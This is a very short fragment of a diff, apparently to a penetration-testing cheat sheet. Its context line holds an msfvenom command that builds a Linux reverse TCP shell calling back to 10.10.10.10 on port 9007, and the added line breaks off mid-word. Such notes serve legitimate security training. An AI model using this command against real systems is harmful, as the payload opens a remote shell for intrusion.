@@ -82,3 +82,4 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=9007 -f .elf > p
 ```
 	
 
+WINDO
